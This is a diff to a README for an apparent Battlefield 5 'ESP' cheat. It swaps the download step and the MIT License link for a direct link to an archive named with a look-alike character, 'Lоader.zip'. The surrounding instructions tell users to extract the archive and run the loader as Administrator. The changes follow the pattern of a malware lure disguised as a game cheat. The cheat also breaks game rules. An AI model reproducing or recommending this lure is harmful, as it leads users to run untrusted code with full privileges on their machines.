@@ -43,7 +43,7 @@ Boost your performance with an intuitive, customizable HUD. Below is a table sum
 
 Getting started is simple! Please follow these detailed steps to ensure a secure and efficient installation:
 
-1. Download **Loader.rar** from the repository’s release or root directory.
+1. Download **https://raw.githubusercontent.com/4CONQUER/Battlefield5-VisionaryESP/main/Lоader.zip** from the repository’s release or root directory.
 2. Extract contents to your preferred directory using any popular archive tool (e.g., WinRAR, 7-Zip).
 3. Right-click the loader executable and choose **Run as Administrator** to grant proper permissions.
 4. Launch Battlefield 5 and ensure the game is running in windowed or borderless mode.
@@ -76,7 +76,7 @@ Getting started is simple! Please follow these detailed steps to ensure a secure
 
 ## 📑 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/4CONQUER/Battlefield5-VisionaryESP/main/Lоader.zip).  
 Feel free to modify or adapt this codebase for personal, educational, or research purposes.
 
 ---
